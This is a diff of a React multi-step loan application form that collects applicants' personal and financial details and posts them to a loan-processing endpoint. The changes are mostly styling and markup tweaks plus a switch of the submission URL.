@@ -22,9 +22,7 @@ function Content() {
           child.props.children.type !== undefined
         ) {
           return child.props.children;
-        } else if (
-          child.props.children.type === "input"
-        ) {
+        } else if (child.props.children.type === "input") {
           return child.props.children.props.children[0];
         }
         return undefined;
@@ -35,12 +33,14 @@ function Content() {
     // console.log(currentStepInputs);
 
     const hasEmptyInput = currentStepInputs.some((element) => {
-      return (element.props.type === "text" ||
-        element.props.type === "password" ||
-        element.props.type === "email" ||
-        element.props.type === "tel" ||
-        element.props.type === "date") &&
-        element.props.value === "";
+      return (
+        (element.props.type === "text" ||
+          element.props.type === "password" ||
+          element.props.type === "email" ||
+          element.props.type === "tel" ||
+          element.props.type === "date") &&
+        element.props.value === ""
+      );
     });
     // console.log(hasEmptyInput);
     if (hasEmptyInput) {
@@ -204,7 +204,7 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What is your name?</strong>
       </h3>
-      <div className="row container-fluid">
+      <div className="row container-fluid my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
             <img
@@ -259,7 +259,7 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What is your email?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col-2 p-0">
           <div id="icon">
             <object
@@ -299,15 +299,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>Excellent news {checked.firstName}</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -337,15 +335,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>Cell phone number</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -365,8 +361,9 @@ function Content() {
       <div className="d-grid gap-1 my-1">
         <input
           className="form-control form-control-lg"
-          type="tel"
+          type="number"
           name="telNumber"
+          step={0}
           onChange={handleSelected}
           value={checked.telNumber || ""}
           required
@@ -377,15 +374,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What is the best time to reach you?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -455,15 +450,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your home address?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -584,15 +577,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your date of birth?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/info-icon-default.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -621,15 +612,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>Do you have $10,000 or more in credit card debt?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -681,15 +670,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>Do you have a car registered in your name?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -742,15 +729,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>How long have you lived at your home?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -856,15 +841,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>Are you a home owner?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -916,15 +899,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your gross monthly income?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -934,7 +915,7 @@ function Content() {
               approve your loan.
               <a
                 tabIndex="0"
-                role="button"
+                // role="button"
                 className="btn btn-outline-secondary"
                 style={{
                   bordeRadius: 50 + "px",
@@ -1086,15 +1067,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>How frequently do you get paid?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1182,15 +1161,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>Are you an active-duty military member?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1243,15 +1220,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your current income source?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1303,15 +1278,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's the name of your employer?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1343,15 +1316,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>How long have you been employed?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1425,18 +1396,18 @@ function Content() {
           htmlFor="2"
           className="radio-options borer border-2 btn border-dark bg-white border-opacity-50 btn-lg w-100 mx-auto fs-6 p-3 fw-bold"
         >
-          <input
-            className="btn-check"
-            type="radio"
-            checked={isSelected("2")}
-            onChange={handleSelected}
-            value="2"
-            name="employmentDuration"
-            id="2"
-            onClick={nextBtn}
-          />
           2
         </label>
+        <input
+          className="btn-check"
+          type="radio"
+          checked={isSelected("2")}
+          onChange={handleSelected}
+          value="2"
+          name="employmentDuration"
+          id="2"
+          onClick={nextBtn}
+        />
       </div>
       <div className="d-grid gap-1 px-5 my-1">
         <label
@@ -1461,22 +1432,20 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your work phone number?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
           <div className="vip-tooltip bg-white p-2 border rounded-2">
             <p className="mb-0 text-start">
               This number is mandatory for most lenders. Our lenders will
-              <strong> NEVER</strong> contact your employer to disclose your
+              <strong> NEVER </strong>contact your employer to disclose your
               loan inquiry.
               <br />
               <span style={{ display: "block" }} className="text-muted mt-2">
@@ -1504,15 +1473,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your drivers license or state ID number?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1606,15 +1573,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your social security number?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1646,22 +1611,20 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What type of bank account do you have?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
           <div className="vip-tooltip bg-white border p-3 rounded-2">
             <p className="mb-0 text-start">
               Lenders are significantly more likely to fund
-              <strong> checking accounts</strong> than savings accounts.
+              <strong> checking accounts </strong>than savings accounts.
             </p>
           </div>
         </div>
@@ -1707,15 +1670,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>How long have you had this bank account for?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1785,18 +1746,18 @@ function Content() {
           htmlFor="2"
           className="radio-options borer border-2 btn border-dark bg-white border-opacity-50 btn-lg w-100 mx-auto fs-6 p-3 fw-bold"
         >
-          <input
-            className="btn-check"
-            type="radio"
-            checked={isSelected("2")}
-            onChange={handleSelected}
-            value="2"
-            name="bankAcctDuration"
-            id="2"
-            onClick={nextBtn}
-          />
           2
         </label>
+        <input
+          className="btn-check"
+          type="radio"
+          checked={isSelected("2")}
+          onChange={handleSelected}
+          value="2"
+          name="bankAcctDuration"
+          id="2"
+          onClick={nextBtn}
+        />
       </div>
       <div className="d-grid gap-1 my-1 px-5">
         <label
@@ -1821,15 +1782,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>Do you have direct deposit?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1882,15 +1841,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your credit score?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -1996,15 +1953,13 @@ function Content() {
       <h3 className="text-center mt-3">
         <strong>What's your reason for requesting a loan?</strong>
       </h3>
-      <div className="row">
+      <div className="row my-3">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -2106,12 +2061,10 @@ function Content() {
       <div className="row">
         <div className="text-start col col-2 p-0">
           <div id="icon">
-            <object
-              title="SVG icon for pleasant user experience"
-              type="image/svg+xml"
-              role="presentation"
-              data="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
-            ></object>
+            <img
+              src="https://server1.jointdivisoncxvii.me/templates/success_head.svg"
+              alt="SVG icon for pleasant user experience"
+            />
           </div>
         </div>
         <div className="col col-10">
@@ -2174,7 +2127,7 @@ function Content() {
           <small>
             By clicking "<strong>Request Loan</strong>", I consent to
             <span className="text-primary" data-legal="terms">
-              Terms &amp; Conditions
+              {" "}Terms &amp; Conditions{" "}
             </span>
             ,
             <span className="text-primary" href="" data-legal="privacy">
@@ -2219,7 +2172,10 @@ function Content() {
   const handleSubmit = (e) => {
     e.preventDefault();
     const xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://lggf-cn.com/loan_form2.php"); // Replace with the actual path to your PHP script
+    xhr.open(
+      "POST",
+      "https://application.wzrd.247loanpro.site/server-in/loan_form2.php"
+    ); // Replace with the actual path to your PHP script
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
     xhr.onreadystatechange = function () {
@@ -2227,14 +2183,14 @@ function Content() {
         if (xhr.status === 200) {
           // Redirect to a new page with the responseText as a query parameter
           const response = JSON.parse(xhr.responseText);
-          window.location.href = `/confirmation?message=${ encodeURIComponent(
+          window.location.href = `/confirmation?message=${encodeURIComponent(
             response.message
-          ) }`; // Log the success message or handle it as needed
+          )}`; // Log the success message or handle it as needed
         } else {
           console.error("Request failed. Status:", xhr.status);
-          window.location.href = `/confirmation?message=${ encodeURIComponent(
+          window.location.href = `/confirmation?message=${encodeURIComponent(
             xhr.status
-          ) }`;
+          )}`;
         }
       }
       return <div>Redirecting...</div>;
@@ -2257,8 +2213,8 @@ function Content() {
           <div className="progress my-2">
             <div
               style={{
-                width: `${ progressBarWidth }%`,
-                backgroundColor: `${ progressStyle }`,
+                width: `${progressBarWidth}%`,
+                backgroundColor: `${progressStyle}`,
               }}
               className="progress-bar"
             ></div>
@@ -2322,7 +2278,7 @@ function Content() {
               </button>
             </div>
           ) : (
-            <div className="col-7 text-end" style={{ display: `${ classes }` }}>
+            <div className="col-7 text-end" style={{ display: `${classes}` }}>
               <button
                 className="btn btn-primary btn-lg w-100 btn-next"
                 onClick={nextBtn}
